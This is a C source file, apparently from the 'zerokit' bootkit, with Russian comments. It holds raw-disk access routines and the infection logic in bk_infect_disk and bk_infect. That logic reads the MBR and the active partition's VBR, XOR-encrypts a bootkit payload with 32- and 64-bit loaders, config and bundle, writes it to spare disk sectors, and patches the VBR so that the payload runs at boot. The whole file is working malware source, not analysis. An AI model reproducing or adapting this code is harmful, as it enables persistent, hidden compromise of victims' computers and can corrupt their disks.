#include "..\..\..\..\loader\mod_shared\zerokit.h"

extern uint8_t* gPayload;

#define SECTOR_SIZE 512
#define DSK_BASIC 0

#define DSK_DYN_SIMPLE 1
#define DSK_DYN_SPANNED 2

typedef struct _drive_info
{
    uint32_t dsk_type;      // Тип диска.
    uint32_t dsk_num;       // Число разделов на диске.
    int use_gpt;            // Использует GPT таблицу разделов.
    int par_numb;           // Номер активного раздела.
    uint64_t par_size;      // Размер раздела.
    struct {
        uint32_t number;    // Номер диска.
        uint64_t size;      // Размер диска в секторах.
        uint64_t prt_start; // Начала раздела на диске.
        uint64_t prt_size;  // Размер раздела.
    } disks[16];
} drive_info_t, *pdrive_info_t;

typedef struct _disk_info
{
    HANDLE hDisk;
    MEDIA_TYPE media;
    uint32_t bytesPerSec; // Количество байт в одном секторе.
    uint32_t secsPerCyl;  // Количество секторов в цилиндре.
    uint64_t totalSecs;   // Общее количество секторов.
} disk_info_t, *pdisk_info_t;

#define IS_INVALID_SECTOR_SIZE(_s) ( (_s) % SECTOR_SIZE )
#define _ALIGN(size, align) (((size) + ((align) - 1)) & ~((align) - 1))

#define FS_UNK   0
#define FS_FAT12 1
#define FS_FAT16 2
#define FS_FAT32 3
#define FS_NTFS  4
#define FS_EXFAT 5


pdisk_info_t bk_disk_open(uint32_t diskNum)
{
    DISK_GEOMETRY diskGeom;
    wchar_t deviceName[MAX_PATH];
    BOOL isOK;
    pdisk_info_t pDiskInfo = NULL;
    uint32_t bytes;

    wsprintfW(deviceName, L"\\\\.\\PhysicalDrive%u", diskNum);

    isOK = 0;
    do {
        pDiskInfo = (pdisk_info_t)VirtualAlloc(0,sizeof(disk_info_t),MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
        if ( pDiskInfo == NULL ) {
            //INLOG("Can't allocate memory for disk_info_t!!", 0);
            break;
        }

        pDiskInfo->hDisk = CreateFileW(deviceName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

        if (pDiskInfo->hDisk == INVALID_HANDLE_VALUE) {
            pDiskInfo->hDisk = NULL;
            //INLOG("Can't open \\\\.\\PhysicalDrive", diskNum);
            break;
        }

       isOK = DeviceIoControl(pDiskInfo->hDisk, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &diskGeom, sizeof(diskGeom), (LPDWORD)&bytes, NULL);

        if (isOK) {
            pDiskInfo->media = diskGeom.MediaType;
            pDiskInfo->bytesPerSec = diskGeom.BytesPerSector;
            pDiskInfo->secsPerCyl = diskGeom.TracksPerCylinder * diskGeom.SectorsPerTrack;
            pDiskInfo->totalSecs = (diskGeom.Cylinders.QuadPart * ((uint64_t)(pDiskInfo->secsPerCyl) * (uint64_t)(pDiskInfo->bytesPerSec)) );
        }
    } while (0);

    if ((!isOK) && (pDiskInfo != NULL))  {
        if (pDiskInfo->hDisk != NULL) {
            CloseHandle(pDiskInfo->hDisk);
        }
        VirtualFree(pDiskInfo, sizeof(disk_info_t), MEM_DECOMMIT|MEM_RELEASE);
        pDiskInfo = NULL;
    }

    return pDiskInfo;
}

void bk_disk_close(pdisk_info_t pDiskInfo)
{
    CloseHandle(pDiskInfo->hDisk);
    VirtualFree(pDiskInfo, sizeof(disk_info_t), MEM_DECOMMIT|MEM_RELEASE);
}

int bk_disk_read(pdisk_info_t pDiskInfo, void* buff, int size, uint64_t offset)
{
    int ret = ERROR_BK_IO;
    uint64_t realOffset;
    uint32_t realSize, bytes;
    uint32_t diffOffset = 0;
    uint8_t* pBuff;

    if ((offset % pDiskInfo->bytesPerSec) || (size % pDiskInfo->bytesPerSec)) {
        diffOffset = offset % pDiskInfo->bytesPerSec;
        realOffset = offset - diffOffset;
        realSize = size + diffOffset;
        realSize = realSize + (pDiskInfo->bytesPerSec - (realSize % pDiskInfo->bytesPerSec));
        pBuff = (uint8_t*)VirtualAlloc(0,realSize,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
    }
    else {
        realOffset = offset;
        realSize = (uint32_t)size;
        pBuff = (uint8_t*)buff;
    }

    do {
        if (pBuff == NULL) {
            //INLOG("Can't allocate memory for read buffer!!", 0);
            ret = ERROR_NO_MEMORY;
            break;
        }

        bytes = SetFilePointer(pDiskInfo->hDisk, (LONG)realOffset, &((LONG*)&realOffset)[1], FILE_BEGIN);

        if (bytes == INVALID_SET_FILE_POINTER) {
            //INLOG("Can't set pointer for reading sectors!!", 0);
            break;
        }

        if (ReadFile(pDiskInfo->hDisk, pBuff, realSize, (LPDWORD)&bytes, NULL) == 0) {
            //INLOG("Can't read data from disk!!", 0);
            break;
        }
        ret = ERROR_NONE;
    } while (0);

    if (pBuff != buff) {
        if (ret == ERROR_NONE) {
            MEMCPY(buff, pBuff + diffOffset, size);
        }
        VirtualFree(pBuff, realSize, MEM_DECOMMIT|MEM_RELEASE);
    }

    return ret;
}

int bk_disk_write(pdisk_info_t pDiskInfo, void* buff, int size, uint64_t offset)
{
    int ret = ERROR_BK_IO;
    uint64_t realOffset;
    uint32_t realSize, bytes;
    uint32_t diffOffset = 0;
    uint8_t* pBuff;

    if ((offset % pDiskInfo->bytesPerSec) || (size % pDiskInfo->bytesPerSec)) {
        diffOffset = offset % pDiskInfo->bytesPerSec;
        realOffset = offset - diffOffset;
        realSize = diffOffset + size;
        realSize = realSize + (pDiskInfo->bytesPerSec - (realSize % pDiskInfo->bytesPerSec));
        pBuff = (uint8_t*)VirtualAlloc(0,realSize,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
    }
    else {
        realOffset = offset;
        realSize = size;
        pBuff = (uint8_t*)buff;
    }

    do {
        if (pBuff == NULL) {
            //INLOG("Can't allocate memory for write buffer!!", 0);
            ret = ERROR_NO_MEMORY;
            break;
        }

        bytes = SetFilePointer(pDiskInfo->hDisk, (LONG)realOffset, &(((LONG*)&realOffset)[1]), FILE_BEGIN);

        if (bytes == INVALID_SET_FILE_POINTER) {
            //INLOG("Can't set pointer for writing sectors!!", 0);
            break;
        }

        if (pBuff != buff) {
            if (ReadFile(pDiskInfo->hDisk, pBuff, realSize, (LPDWORD)&bytes, NULL) == 0) {
                //INLOG("Can't read sectors in writing function!!", 0);
                break;
            }

            MEMCPY(pBuff + diffOffset, buff, size);

            SetFilePointer(pDiskInfo->hDisk, (LONG)realOffset, &((LONG*)&realOffset)[1], FILE_BEGIN);

            if (WriteFile(pDiskInfo->hDisk, pBuff, realSize, (LPDWORD)&bytes, NULL) == 0) {
                //INLOG("Can't write sectors!!", 0);
                break;
            }
            ret = ERROR_NONE;
        }
        else {
            if (WriteFile(pDiskInfo->hDisk, pBuff, realSize, (LPDWORD)&bytes, NULL) == 0) {
                //INLOG("Can't write sectors!!", 0);
                break;
            }
            ret = ERROR_NONE;
        }
    } while (0);

    if (pBuff != buff) {
        VirtualFree(pBuff, realSize, MEM_DECOMMIT|MEM_RELEASE);
    }

    return ret;	
}

uint64_t dc_dsk_get_size(int dsk_num, int precision) 
{
    pdisk_info_t pDiskInfo = NULL;
    uint64_t mid, size  = 0;
    uint64_t high, low;
    uint64_t bps, pos;
    uint32_t bytes;
    DISK_GEOMETRY_EX dgx;
    uint8_t buff[SECTOR_SIZE];

    do {
        if ((pDiskInfo = bk_disk_open(dsk_num)) == NULL) {
            break;
        }

        if (DeviceIoControl(pDiskInfo->hDisk, IOCTL_DISK_GET_DRIVE_GEOMETRY_EX, NULL, 0, (PVOID)&dgx, sizeof(dgx), (LPDWORD)&bytes, NULL)) {
            size = dgx.DiskSize.QuadPart;
            break;
        }

        bps = (uint64_t)pDiskInfo->bytesPerSec;
        high = (((uint64_t)pDiskInfo->secsPerCyl * bps) + pDiskInfo->totalSecs) / bps;
        low = pDiskInfo->totalSecs / bps;
        size = pDiskInfo->totalSecs;

        /* binary search disk space in hidden cylinder */
        if (precision != 0) {
            do {
                mid = (high + low) / 2;
                pos = mid * bps;

                if (bk_disk_read(pDiskInfo, buff, sizeof(buff), pos) == ERROR_NONE) {
                    low = mid+1; 
                } else {
                    high = mid-1;
                }

                if (high <= low) {
                    size = low * bps; break;
                }
            } while (1);
        }
    } while (0);

    if (pDiskInfo != NULL) {
        bk_disk_close(pDiskInfo);
    }

    return size;
}

int bk_get_drive_info(wchar_t* name, pdrive_info_t pInfo)
{
    int ret;
	PARTITION_INFORMATION_EX parInfoEx[2];
	PARTITION_INFORMATION parInfo[2];
	STORAGE_DEVICE_NUMBER stDevNum;
	uint8_t* pbuff = NULL; //[4096];
	uint32_t bytes, i;	
	BOOL isOK;
	HANDLE hDisk;
	PVOLUME_DISK_EXTENTS diskExt;

    pbuff = (uint8_t*)VirtualAlloc(0,4096,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);

    if (pbuff == NULL) {
        //INLOG("Can't allocate memory for temp buffer", 0);
        ret = ERROR_NO_MEMORY;
        return ret;
    }

    diskExt = (PVOLUME_DISK_EXTENTS)pbuff;

	MEMSET(pInfo, 0, sizeof(drive_info_t));
	
	do {
		hDisk = CreateFileW(name, SYNCHRONIZE | GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

		if (hDisk == INVALID_HANDLE_VALUE) {
            //INLOG("Can't open \\\\.\\GLOBALROOT\\ArcName\\multi(0)disk(0)rdisk(0)partition(1)", 0);
			ret = ERROR_BK_UNKNOWN;
            break;
		}

		isOK = DeviceIoControl(hDisk, IOCTL_DISK_GET_PARTITION_INFO_EX, NULL, 0, parInfoEx, sizeof(parInfoEx), (LPDWORD)&bytes, NULL);

		if (isOK) {
			/*	if (ptix.PartitionStyle = PARTITION_STYLE_GPT) {
				info->use_gpt = 1;
			 */
			pInfo->dsk_num = parInfoEx[0].PartitionNumber;
			pInfo->par_size = parInfoEx[0].PartitionLength.QuadPart;				
		}
        else {
			isOK = DeviceIoControl(hDisk, IOCTL_DISK_GET_PARTITION_INFO, NULL, 0, parInfo, sizeof(parInfo), (LPDWORD)&bytes, NULL);

			if (!isOK) {
                //INLOG("IO error during obtaining boot disk 1", fnGetLastError());
				ret = ERROR_BK_IO;
                break;
			}

			pInfo->use_gpt = 0;
			pInfo->dsk_num = parInfo[0].PartitionNumber;
			pInfo->par_size = parInfo[0].PartitionLength.QuadPart;
		}

		isOK = DeviceIoControl(hDisk, IOCTL_STORAGE_GET_DEVICE_NUMBER, NULL, 0, &stDevNum, sizeof(stDevNum), (LPDWORD)&bytes, NULL);

		if (isOK) {
			pInfo->dsk_num = 1;
			pInfo->dsk_type = DSK_BASIC;
			pInfo->par_numb = stDevNum.PartitionNumber;
			pInfo->disks[0].number = stDevNum.DeviceNumber;
			pInfo->disks[0].size = dc_dsk_get_size(stDevNum.DeviceNumber, 0);
		}
        else {
			isOK = DeviceIoControl(hDisk, IOCTL_VOLUME_GET_VOLUME_DISK_EXTENTS, NULL, 0, diskExt, sizeof(pbuff), (LPDWORD)&bytes, NULL);
				
			if (isOK) {
				for (i = 0; i < diskExt->NumberOfDiskExtents; i++) {
					pInfo->disks[i].number = diskExt->Extents[i].DiskNumber;
					pInfo->disks[i].prt_start = diskExt->Extents[i].StartingOffset.QuadPart;
					pInfo->disks[i].prt_size = diskExt->Extents[i].ExtentLength.QuadPart;
					pInfo->disks[i].size = dc_dsk_get_size(pInfo->disks[i].number, 0);
				}

				if ((pInfo->dsk_num = diskExt->NumberOfDiskExtents) == 1) {
					pInfo->dsk_type = DSK_DYN_SIMPLE;
				}
                else {					
					pInfo->dsk_type = DSK_DYN_SPANNED;
				}
			}
            else {
                //INLOG("IO error during obtaining boot disk 2", 0);
				ret = ERROR_BK_IO;
                break;
			}
		}
		ret = ERROR_NONE;
	} while (0);

	if (hDisk != INVALID_HANDLE_VALUE) {
		CloseHandle(hDisk);
	}

    if (pbuff != NULL) {
        VirtualFree(pbuff, 4096, MEM_DECOMMIT|MEM_RELEASE);
    }

	return ret;
}

int bk_get_bootable_disk(uint32_t* pDiskNum1, uint32_t* pDiskNum2)
{
    int ret;
    drive_info_t driveInfo;

    ret = bk_get_drive_info(L"\\\\.\\GLOBALROOT\\ArcName\\multi(0)disk(0)rdisk(0)partition(1)", &driveInfo);

    if ((ret != ERROR_NONE) || (driveInfo.dsk_num > 2)) {
        //INLOG("Can't obtain boot disk!!", 0);
        ret = ERROR_BK_BOOT_DISK_NOT_FOUND;
    }
    else {
        if (driveInfo.dsk_num > 1) {
            *pDiskNum1 = driveInfo.disks[0].number;
            *pDiskNum2 = driveInfo.disks[1].number;
        }
        else {
            *pDiskNum1 = driveInfo.disks[0].number;
            *pDiskNum2 = driveInfo.disks[0].number;
        }
    }
    return ret;
}

int util_memcmp(const void* buf1, const void* buf2, size_t count)
{
    if (!count) {
        return 0;
    }

    while(--count && *(char*)buf1 == *(char*)buf2 ) {
        buf1 = (char*)buf1 + 1;
        buf2 = (char*)buf2 + 1;
    }

    return(*((unsigned char*)buf1) - *((unsigned char*)buf2));
}


int bk_check_fs_type(uint8_t* buff)
{
    if (util_memcmp(buff + 3, "NTFS    ", 8) == 0) {
        return FS_NTFS;
    }
    if (util_memcmp(buff + 54, "FAT12   ", 8) == 0) {
        return FS_FAT12;
    }
    if (util_memcmp(buff + 54, "FAT16   ", 8) == 0) {
        return FS_FAT16;
    }
    if (util_memcmp(buff + 82, "FAT32   ", 8) == 0) {
        return FS_FAT32;
    }
    if (util_memcmp(buff + 3, "EXFAT   ", 8) == 0) {
        return FS_EXFAT;
    }
    return FS_UNK;
}

uint32_t rol(uint32_t value, int places) 
{ 
    return (value << places) | (value >> (32 - places)); 
}

int bk_infect_disk(uint32_t diskNum, int begin)
{
    int ret;
    bk_mbr_t origMBR;
    bk_ntfs_vbr_t ntfsVBR;
    uint64_t diskSize;
    uint64_t max_end;
    uint64_t min_str;
    uint64_t bkBodyOffset;
    ppartition_table_entry_t pPartEntry;
    ppartition_table_entry_t pActivePartEntry = NULL;
    uint8_t* pNewData = NULL;
    uint8_t* pRealData = NULL;
    int realSize, i, bkSize, ldr32Size, ldr64Size, configSize, bundleSize;
    pdisk_info_t pDiskInfo = NULL;
    pzerokit_header_t pRealPayloadHeader, pPayloadHeader = (pzerokit_header_t)(gPayload + 1024 + 2);
    pmods_pack_header_t pMods32Hdr, pMods64Hdr;
    pmod_header_t pModHeader;
    ploader32_info_t pLdr32Info;
    ploader64_info_t pLdr64Info;
    uint16_t bkPadSize;
    uint16_t bkKeyOffset;
    pbios_dap_t pOrigVbrDap;
    uint32_t diff;

    do {
        if ((pDiskInfo = bk_disk_open(diskNum)) == NULL ) {
            //INLOG("Can't open disk", diskNum);
            ret = ERROR_BK_UNKNOWN;
            break;
        }

        if (IS_INVALID_SECTOR_SIZE(pDiskInfo->bytesPerSec) != 0) {
            ret = ERROR_UNSUPPORTED_SECTOR_SIZE;
            break;
        }

        if (pPayloadHeader->sizeOfBootkit <= SECTOR_SIZE) {
            //INLOG("Invalid size of bootkit", 0);
            ret = ERROR_BK_UNKNOWN;
            break;
        }

//         MEMCPY(&mbr, gPayload, sizeof(mbr));

        pMods32Hdr = (pmods_pack_header_t)(gPayload + pPayloadHeader->sizeOfBootkit);
        pMods64Hdr = (pmods_pack_header_t)((uint8_t*)pMods32Hdr + sizeof(mods_pack_header_t) + pMods32Hdr->sizeOfPack);

        // Выравниваем размер тела буткита до размера сектора.
        bkSize = pPayloadHeader->sizeOfBootkit - 4;
        ldr32Size = _ALIGN(pMods32Hdr->sizeOfPack, SECTOR_SIZE);
        ldr64Size = _ALIGN(pMods64Hdr->sizeOfPack, SECTOR_SIZE);
        configSize = _ALIGN(pPayloadHeader->sizeOfConfig, SECTOR_SIZE);
        bundleSize = _ALIGN(pPayloadHeader->sizeOfBundle, SECTOR_SIZE);
        realSize = bkSize + ldr32Size + ldr64Size + configSize + bundleSize;
        pNewData = VirtualAlloc(0, 512 + realSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); // 512 - первый сектор оригинального VBR.

        if (pNewData == NULL) {
            //INLOG("Can't allocate memory for bootkit content", 0);
            ret = ERROR_NO_MEMORY;
            break;
        }

        pRealData = pNewData + 512;

        bkPadSize = *(uint16_t*)(gPayload + bkSize);
        bkKeyOffset = *(uint16_t*)(gPayload + bkSize + 2);

        MEMSET(pRealData, 0, realSize);
        // Копируем буткит.
        MEMCPY(pRealData, gPayload, bkSize);

        pLdr32Info = (ploader32_info_t)(pRealData + bkSize - bkPadSize - pPayloadHeader->sizeOfBkPayload64 - sizeof(loader32_info_t));
        MEMSET(pLdr32Info, 0, sizeof(loader32_info_t));
        pLdr64Info = (ploader64_info_t)(pRealData + bkSize - bkPadSize - sizeof(loader64_info_t));
        MEMSET(pLdr64Info, 0, sizeof(loader64_info_t));

        // Копируем 32-битную часть.
        pModHeader = (pmod_header_t)(pRealData + bkSize);
        MEMCPY(pModHeader, (uint8_t*)pMods32Hdr + sizeof(mods_pack_header_t), pMods32Hdr->sizeOfPack);
        pModHeader->reserved1 = ldr32Size + ldr64Size;
        pModHeader->reserved2 = configSize;

        // Копируем 64-битную часть.
        pModHeader = (pmod_header_t)(pRealData + bkSize + ldr32Size);
        MEMCPY(pModHeader, (uint8_t*)pMods64Hdr + sizeof(mods_pack_header_t), pMods64Hdr->sizeOfPack);
        pModHeader->reserved1 = ldr64Size;
        pModHeader->reserved2 = configSize;

        // Копируем конфигурационный блок.
        MEMCPY(pRealData + bkSize + ldr32Size + ldr64Size, (uint8_t*)pMods64Hdr + sizeof(mods_pack_header_t) + pMods64Hdr->sizeOfPack, pPayloadHeader->sizeOfConfig);

        // Копируем бандл.
        MEMCPY(pRealData + bkSize + ldr32Size + ldr64Size + configSize, (uint8_t*)pMods64Hdr + sizeof(mods_pack_header_t) + pMods64Hdr->sizeOfPack + pPayloadHeader->sizeOfConfig, pPayloadHeader->sizeOfBundle);

        pLdr32Info->loaderSize = ldr32Size + ldr64Size + configSize;
        pLdr64Info->loaderSize = ldr64Size + configSize;

        pRealPayloadHeader = (pzerokit_header_t)(pRealData + 1024 + 2);
        MEMCPY(pRealPayloadHeader, pPayloadHeader, sizeof(zerokit_header_t));
        pRealPayloadHeader->sizeOfBootkit = bkSize;
        pRealPayloadHeader->sizeOfPack = realSize - configSize - bundleSize + 512;
        pRealPayloadHeader->sizeOfConfig = configSize;
        pRealPayloadHeader->sizeOfBundle = bundleSize;

        // Получаем размер диска.
        if ((diskSize = dc_dsk_get_size(diskNum, 1)) == 0) {
            //INLOG("Can't obtain disk size", 0);
            ret = ERROR_BK_IO;
            break;
        }

        // Считываем оригинальный MBR.
        if ((ret = bk_disk_read(pDiskInfo, &origMBR, sizeof(origMBR), 0)) != ERROR_NONE) {
            //INLOG("Can't read original MBR", 0);
            break;
        }

        if ((origMBR.magic != 0xAA55) || (bk_check_fs_type((uint8_t*)&origMBR) != FS_UNK) ) {
            ret = ERROR_BK_MBR;
            break;
        }

        // Ищем свободное место перед разделом и после.
        min_str = 64;
        max_end = 0;
        for (i = 0, max_end = 0; i < 4; ++i)  {
            if ((pPartEntry = &origMBR.pt[i])->totalSects == 0) { // пропускаем пустые разделы
                continue;
            }

            if (pPartEntry->active == 0x80) {
                pActivePartEntry = pPartEntry;
            }

            min_str = min(min_str, pPartEntry->startSect);
            max_end = max(max_end, pPartEntry->startSect + pPartEntry->totalSects);
        }
        max_end *= (uint64_t)pDiskInfo->bytesPerSec;
        min_str *= (uint64_t)pDiskInfo->bytesPerSec;

        if (begin != 0) {
            if (min_str < realSize + SECTOR_SIZE) {
                ret = ERROR_BK_NO_SPACE;
                break;
            }
            bkBodyOffset = SECTOR_SIZE;		
        }
        else {
            bkBodyOffset = diskSize - realSize - (FREE_SPACE_AFTER * SECTOR_SIZE); // Записываем тело буткита с конца и оставляем 64 сектора.

            if (max_end > bkBodyOffset) {
                ret = ERROR_BK_NO_SPACE;
                break;
            }
        }

        if (pActivePartEntry == NULL) {
            ret = ERROR_BK_BOOT_DISK_NOT_FOUND;
            break;
        }

        // Загружаем VBR.
        if ((ret = bk_disk_read(pDiskInfo, &ntfsVBR, sizeof(ntfsVBR), (uint64_t)pActivePartEntry->startSect * SECTOR_SIZE)) != ERROR_NONE) {
            //INLOG("Can't read VBR", 0);
            break;
        }

        // Проверяем, не установлены ли мы уже.
        diff = (ntfsVBR.bpb.hiddenSectors > pActivePartEntry->startSect ? ntfsVBR.bpb.hiddenSectors - pActivePartEntry->startSect : pActivePartEntry->startSect - ntfsVBR.bpb.hiddenSectors);
        if (diff > 511) {
            bk_ntfs_vbr_t realVBR;
            if ((ret = bk_disk_read(pDiskInfo, &realVBR, sizeof(realVBR), bkBodyOffset)) != ERROR_NONE) {
                //INLOG("Can't read VBR", 0);
                break;
            }

            if ((*((uint64_t*)realVBR.oemName) == 0x202020205346544EULL || *((uint64_t*)realVBR.oemName) == 0x302E35534F44534DULL) && realVBR.endOfSectorMarker == 0xAA55) {
                ret = ERROR_BK_ALREADY_INSTALLED;
                // Мы уже установлены - завершаемся.
                break;
            }
        }

        // Сохраняем оригинальный VBR.
        MEMCPY(pNewData, &ntfsVBR, sizeof(ntfsVBR));

        ntfsVBR.bpb.hiddenSectors = (uint32_t)(bkBodyOffset / SECTOR_SIZE);
        //         if (*((uint64_t*)ntfsVBR.oemName) == 0x202020205346544EULL) { // NTFS VBR
        // 
        //         }
        //         else
        if (*((uint64_t*)ntfsVBR.oemName) == 0x302E35534F44534DULL) { // FAT32 VBR
            ntfsVBR.bpb.hiddenSectors -= 0x0C - 2; // запуск в FAT32 сразу с нужного сектора.
        }

        // Записываем модифицированный VBR.
        if ((ret = bk_disk_write(pDiskInfo, &ntfsVBR, sizeof(ntfsVBR), (uint64_t)pActivePartEntry->startSect * SECTOR_SIZE)) != ERROR_NONE) {
            //INLOG("Can't write modified VBR", 0);
            break;
        }

        pLdr32Info->loaderOffset = bkBodyOffset + 512 + bkSize;
        pLdr64Info->loaderOffset = pLdr32Info->loaderOffset + ldr32Size;
        pLdr32Info->startSector = pLdr64Info->startSector = (uint32_t)(bkBodyOffset / SECTOR_SIZE);

        // Смещение до оригинального загрузочного VBR.
        pOrigVbrDap = (pbios_dap_t)(pRealData + 512 + 2);
        *((uint32_t*)&pOrigVbrDap->sector) = pActivePartEntry->startSect;
        // Смещение до тела буткита.
        ++pOrigVbrDap;
        *((uint32_t*)&pOrigVbrDap->sector) = pLdr32Info->startSector;

        // Подсчитываем hash и шифруем буткит, начиная с 512 байта.
        {
            uint32_t crcVal = 0;
            uint8_t* itr = pRealData + 1024 + 2 + sizeof(zerokit_header_t);
            uint8_t* end = pRealData + bkSize - 4;
            uint8_t* zbkKeyItr = gPayload + bkKeyOffset - 512;
            uint8_t* keyItr = zbkKeyItr;

            for ( ; itr < end; ++itr) {
                crcVal = rol(crcVal, 7);
                *((uint8_t*)&crcVal) ^= *itr;
            }

            *((uint32_t*)itr) = crcVal;

            end += 4;
            for (itr = pRealData + 1024 + 2 + sizeof(zerokit_header_t); itr < end; ++itr) {
                *itr ^= *keyItr;

                ++keyItr;
                if ((keyItr - zbkKeyItr) >= 64) {
                    keyItr = zbkKeyItr;
                }
            }
        }

        // Записываем тело буткита.
        if ((ret = bk_disk_write(pDiskInfo, pNewData, 512 + realSize, bkBodyOffset)) != ERROR_NONE) {
            //INLOG("Can't write bootkit body", 0);
            break;
        }
    } while (0);

    if (pDiskInfo != NULL) {
        bk_disk_close(pDiskInfo);
    }

    if (pNewData != NULL) {
        VirtualFree(pNewData, 512 + realSize, MEM_RELEASE);
    }

    return ret;
}

int bk_infect(int begin)
{
    int ret;
    uint32_t diskNum1, diskNum2;

    ret = bk_get_bootable_disk(&diskNum1, &diskNum2);

    if (ret == ERROR_NONE) {
        ret = bk_infect_disk(diskNum1, begin);

        if ( (ret == ERROR_NONE) && (diskNum1 != diskNum2) ) {
            ret = bk_infect_disk(diskNum2, begin);
        }
    }

    return ret;
}
